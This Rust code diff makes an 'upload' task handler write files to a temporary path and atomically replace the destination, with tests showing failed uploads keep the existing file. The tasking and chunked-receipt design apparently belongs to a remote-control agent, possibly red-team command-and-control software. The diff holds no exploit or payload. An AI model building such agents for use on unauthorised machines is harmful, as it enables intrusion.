@@ -77,6 +77,7 @@ struct PendingUpload {
     task_id: Uuid,
     file_id: Uuid,
     dest: PathBuf,
+    temp_dest: PathBuf,
     display_dest: String,
     max_bytes: u64,
     written: u64,
@@ -107,6 +108,15 @@ fn clean_filename(name: &str) -> Option<String> {
 
 fn path_looks_like_dir(input: &str) -> bool {
     input.ends_with('/') || input.ends_with('\\')
+}
+
+fn temp_path_for(dest: &Path, task_id: Uuid) -> PathBuf {
+    let mut name = dest
+        .file_name()
+        .map(|n| n.to_string_lossy().to_string())
+        .unwrap_or_else(|| "upload".into());
+    name.push_str(&format!(".nanaz-{task_id}.tmp"));
+    dest.with_file_name(name)
 }
 
 fn upload_destination(path: &str, original_filename: Option<&str>) -> Result<PathBuf, String> {
@@ -171,8 +181,22 @@ fn upload_complete_response(state: &PendingUpload) -> TaskResponse {
 }
 
 fn cleanup_failed_upload(state: &PendingUpload, message: &str) -> TaskResponse {
-    let _ = std::fs::remove_file(&state.dest);
+    let _ = std::fs::remove_file(&state.temp_dest);
     TaskResponse::failed(state.task_id, message)
+}
+
+fn replace_with_temp(temp: &Path, dest: &Path) -> Result<(), String> {
+    if cfg!(windows) && dest.exists() {
+        std::fs::remove_file(dest)
+            .map_err(|e| format!("replace {} failed: {e}", display_path(dest)))?;
+    }
+    std::fs::rename(temp, dest).map_err(|e| {
+        format!(
+            "move {} to {} failed: {e}",
+            display_path(temp),
+            display_path(dest)
+        )
+    })
 }
 
 pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResponse> {
@@ -254,7 +278,7 @@ pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResp
             .write(true)
             .append(chunk_num > 1)
             .truncate(chunk_num == 1)
-            .open(&state.dest)
+            .open(&state.temp_dest)
             .and_then(|mut file| file.write_all(&chunk));
         if let Err(e) = file_result {
             out.push(cleanup_failed_upload(
@@ -271,7 +295,13 @@ pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResp
                 "[upload] wrote {} bytes to {}",
                 state.written, state.display_dest
             );
-            out.push(upload_complete_response(&state));
+            match replace_with_temp(&state.temp_dest, &state.dest) {
+                Ok(()) => out.push(upload_complete_response(&state)),
+                Err(e) => {
+                    let _ = std::fs::remove_file(&state.temp_dest);
+                    out.push(TaskResponse::failed(state.task_id, &e));
+                }
+            }
         } else {
             let next_chunk = chunk_num + 1;
             state.next_chunk = next_chunk;
@@ -327,6 +357,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             task_id: task.id,
             file_id,
             dest: dest.clone(),
+            temp_dest: temp_path_for(&dest, task.id),
             display_dest: display_path(path),
             max_bytes: params
                 .max_bytes
@@ -352,12 +383,13 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     let cursor = std::io::Cursor::new(file_bytes.as_bytes());
     let mut decoder = DecoderReader::new(cursor, &STANDARD);
 
-    let file = match std::fs::File::create(path) {
+    let temp_dest = temp_path_for(path, task.id);
+    let file = match std::fs::File::create(&temp_dest) {
         Ok(f) => f,
         Err(e) => {
             return TaskResponse::failed(
                 task.id,
-                &format!("create {} failed: {e}", display_path(path)),
+                &format!("create {} failed: {e}", display_path(&temp_dest)),
             );
         }
     };
@@ -388,11 +420,16 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
 
     if let Err(e) = decode_result {
         // Best-effort cleanup of the partial file.
-        let _ = std::fs::remove_file(path);
+        let _ = std::fs::remove_file(&temp_dest);
         return TaskResponse::failed(
             task.id,
             &format!("upload {} failed: {e}", display_path(path)),
         );
+    }
+
+    if let Err(e) = replace_with_temp(&temp_dest, path) {
+        let _ = std::fs::remove_file(&temp_dest);
+        return TaskResponse::failed(task.id, &e);
     }
 
     info!("[upload] wrote {} bytes to {}", written, display_path(path));
@@ -467,6 +504,35 @@ mod tests {
         };
         let resp = handle(&task);
         assert!(resp.status.as_deref() == Some("error"));
+    }
+
+    #[test]
+    fn test_upload_invalid_base64_preserves_existing_file() {
+        let tmp_path = {
+            let mut p = std::env::temp_dir();
+            p.push(format!(
+                "nanaz_up_existing_invalid_{}.bin",
+                std::process::id()
+            ));
+            p
+        };
+        std::fs::write(&tmp_path, b"original").unwrap();
+        let task = TaskMessage {
+            id: Uuid::new_v4(),
+            command: "upload".into(),
+            parameters: serde_json::json!({
+                "path": tmp_path.to_string_lossy(),
+                "file_bytes": "!!!not-valid-base64!!!",
+            })
+            .to_string(),
+            ..Default::default()
+        };
+
+        let resp = handle(&task);
+
+        assert_eq!(resp.status.as_deref(), Some("error"));
+        assert_eq!(std::fs::read(&tmp_path).unwrap(), b"original");
+        let _ = std::fs::remove_file(tmp_path);
     }
 
     #[test]
@@ -555,6 +621,49 @@ mod tests {
         assert_eq!(responses.len(), 1);
         assert_eq!(responses[0].status.as_deref(), Some("error"));
         assert!(!tmp_path.exists());
+    }
+
+    #[test]
+    fn test_upload_chunk_failure_preserves_existing_file() {
+        let file_id = Uuid::new_v4();
+        let tmp_path = {
+            let mut p = std::env::temp_dir();
+            p.push(format!(
+                "nanaz_up_existing_chunk_fail_{}_{}.bin",
+                std::process::id(),
+                file_id
+            ));
+            p
+        };
+        std::fs::write(&tmp_path, b"original").unwrap();
+
+        let task = TaskMessage {
+            id: Uuid::new_v4(),
+            command: "upload".into(),
+            parameters: serde_json::json!({
+                "path": tmp_path.to_string_lossy(),
+                "file_id": file_id,
+            })
+            .to_string(),
+            ..Default::default()
+        };
+        let request = handle(&task);
+        assert_eq!(request.status.as_deref(), Some("processing"));
+
+        let responses = responses_from_receipts(&[PostResponseReceipt {
+            task_id: task.id,
+            status: "success".into(),
+            file_id: Some(file_id),
+            chunk_num: Some(1),
+            total_chunks: Some(1),
+            chunk_data: Some("!!!not-valid-base64!!!".into()),
+            ..Default::default()
+        }]);
+
+        assert_eq!(responses.len(), 1);
+        assert_eq!(responses[0].status.as_deref(), Some("error"));
+        assert_eq!(std::fs::read(&tmp_path).unwrap(), b"original");
+        let _ = std::fs::remove_file(tmp_path);
     }
 
     #[test]
